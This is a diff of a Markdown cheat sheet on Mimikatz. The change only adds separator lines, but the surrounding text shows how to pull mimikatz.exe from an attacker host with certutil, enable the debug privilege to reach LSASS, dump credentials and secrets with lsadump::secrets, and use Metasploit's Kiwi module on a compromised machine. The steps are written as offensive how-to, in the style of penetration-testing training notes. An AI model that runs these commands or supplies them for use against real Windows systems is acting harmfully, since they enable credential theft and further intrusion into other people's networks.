@@ -1,5 +1,6 @@
 **Mimikatz** allows to extract sensitive data, such as plaintext passwords, password hashes, and Kerberos tickets, directly from a system's memory. Its capabilities, such as credential dumping, Pass-the-Hash, and Golden Ticket attacks, highlight weaknesses in Windows security.
 
+---
 
 ## Transmit and Execute Mimikatz 
 
@@ -25,6 +26,8 @@ certutil -urlcache -f http://<attacker-ip>:<port>/mimikatz.exe mimikatz.exe
 mimikatz.exe
 ```
 
+---
+
 ## Enable Debug Privileges
 
 For Mimikatz to interact with Windows security processes like LSASS (Local Security Authority Subsystem Service), you must grant it the necessary privileges. This is done by enabling the `debug` privilege within Mimikatz:
@@ -33,7 +36,7 @@ For Mimikatz to interact with Windows security processes like LSASS (Local Secur
 privilege::debug
 ```
 
-
+---
 ## Dumping Credentials
 
 Mimikatz can dump various credentials, such as passwords, hashes, and Kerberos tickets, from memory. Below are the most common commands to extract these credentials:
@@ -66,6 +69,8 @@ The `lsadump::secrets` command in Mimikatz is used to extract secrets (like pass
 ```bash
 lsadump::secrets
 ```
+
+---
 
 ## Dumping Credentials with Kiwi
 The **Kiwi module** in Metasploit is a module based on the **mimikatz** tool and allows you to extract sensitive data, such as plaintext passwords, password hashes, and Kerberos tickets, from a compromised machine. Here's a breakdown of how to use it for dumping credentials.
